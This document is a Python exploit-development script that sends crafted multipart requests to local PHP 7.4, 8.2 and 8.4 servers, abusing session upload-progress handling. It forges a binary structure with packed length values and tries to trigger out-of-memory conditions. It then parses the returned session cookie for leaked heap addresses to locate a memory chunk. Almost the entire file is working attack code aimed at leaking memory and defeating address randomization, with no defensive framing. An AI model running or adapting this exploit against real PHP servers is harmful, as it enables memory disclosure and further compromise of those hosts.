"""Try to trigger OOM via a PHP script that allocates memory internally.
This bypasses the per-field limit because the allocation happens inside PHP,
not in the multipart parser.
"""
import sys, os, time, struct, http.client
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import exploit as E
from collections import Counter

def test_php_oom(port, label, method="str_repeat"):
    """Test PHP-internal OOM triggers."""
    URL = f"http://127.0.0.1:{port}/"
    t = E.Target(URL, timeout=180.0, verbose=False)

    # First, set up the session with a large value via a PHP script
    # We'll use the upload progress feature to trigger OOM from inside PHP
    print(f"\n--- {label} ({method}) ---", flush=True)

    # Request 1: Set up session with a large value
    parts = [{"name": f"p{i:04d}", "data": b"x"} for i in range(1001)]
    parts += [
        {"name": "PHPSESSID", "data": b"\x00"},
        {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
        {"name": "f", "filename": "a.txt", "data": b"A" * 64},
    ]
    # Add a moderate field (within the per-field limit)
    parts.append({"name": "big", "data": b"B" * int(10 * 1024 * 1024)})  # 10MB
    print(f"  Request 1: 10MB field (within limit)", flush=True)

    try:
        r1 = t.post(E.build_multipart(parts, b"S" * 17), b"S" * 17, read_cap=1 << 20, timeout=180)
        print(f"    Response: {len(r1)}B", flush=True)
    except Exception as e:
        print(f"    REQUEST1 ERROR: {e}", flush=True)
        return False
    time.sleep(0.5)

    # Request 2: Try to leak
    parts = [
        {"name": "PHPSESSID", "data": E.SID},
        {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
    ]
    for i in range(841):
        val = (f"v{i:04d}" + "x" * 44)[:48]
        parts.append({"name": str(1000 + i), "data": val.encode()})
    forge = bytearray(b"A" * 79)
    struct.pack_into("<Q", forge, 0x10, 0x1000)
    forge[0x18] = ord("L")
    parts.append({"name": "1999", "data": bytes(forge)})
    try:
        r2 = t.post(E.build_multipart(parts, b"B" * 10), b"B" * 10, read_cap=9 << 20, timeout=180)
        raw = E.parse_cookie(r2)
        oom = len(raw) > 100
        c = Counter()
        for i in range(0, len(raw) - 8, 8):
            v = int.from_bytes(raw[i:i + 8], "little")
            if 0x700000000000 <= v < 0x800000000000:
                c[v & ~0x1FFFFF] += 1
        chunk = c.most_common(1)[0][0] if c else 0
        tag = " *** OOM/LEAK ***" if oom else "(no OOM)"
        chunk_str = f" chunk=0x{chunk:x}" if chunk else ""
        print(f"    cookie={len(raw)}B{tag}{chunk_str}", flush=True)
        return oom
    except Exception as e:
        print(f"    REQUEST2 ERROR: {e}", flush=True)
        return False

# Test on 7.4.33
print("=== PHP OOM test on 7.4.33 ===", flush=True)
test_php_oom(18108, "7.4.33", "10MB field")
time.sleep(1)

# Test on 8.2.34
print("\n=== PHP OOM test on 8.2.34 ===", flush=True)
test_php_oom(18111, "8.2.34", "10MB field")
time.sleep(1)

# Test on 8.4.26 (control)
print("\n=== PHP OOM test on 8.4.26 (control) ===", flush=True)
test_php_oom(18113, "8.4.26", "10MB field")
time.sleep(1)

print("\n=== done ===", flush=True)
